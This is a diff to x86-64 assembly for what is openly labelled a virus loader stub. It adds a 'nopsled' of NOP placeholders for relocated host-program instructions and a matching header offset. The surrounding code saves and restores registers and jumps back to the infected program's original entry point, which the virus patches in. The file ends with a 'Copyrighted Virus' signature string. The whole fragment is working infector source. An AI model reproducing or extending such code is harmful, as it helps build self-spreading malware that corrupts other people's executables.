@@ -5,6 +5,7 @@ section .text
 	global jump_back_to_client
 	global loader_exit
 	global virus_header_struct
+	global nopsled
 
 extern virus
 
@@ -30,6 +31,10 @@ loader_entry:
 ; space for structure fields
 	sub rsp, end_virus_header - virus_header_struct
 
+; dist_nopsled_loader
+	lea r11, [rel virus_header_struct + 0x40]
+	mov r11, [r11]
+	mov [rsp + 0x40], r11
 ; dist_client_loader
 	lea r11, [rel virus_header_struct + 0x38]
 	mov r11, [r11]
@@ -84,7 +89,12 @@ return_to_client:
 	pop rbx                    ; restore rbx
 	pop rdx                    ; restore rdx
 	pop rcx                    ; restore rcx
-
+nopsled:
+	nop                        ; placeholders for client instructions
+	nop
+	nop
+	nop
+	nop
 jump_back_to_client:
 	jmp 0xffffffff             ; jump back to entry (addr written by virus)
 loader_exit:
@@ -98,5 +108,6 @@ virus_header_struct:
 	dq loader_entry                                   ; dist_vircall_loader
 	dq loader_entry                                   ; dist_header_loader
 	dq loader_entry                                   ; dist_client_loader
+	dq loader_entry                                   ; dist_nopsled_loader
 end_virus_header:
 	db "Warning : Copyrighted Virus by __UNICORNS_OF_THE_APOCALYPSE__ <3"
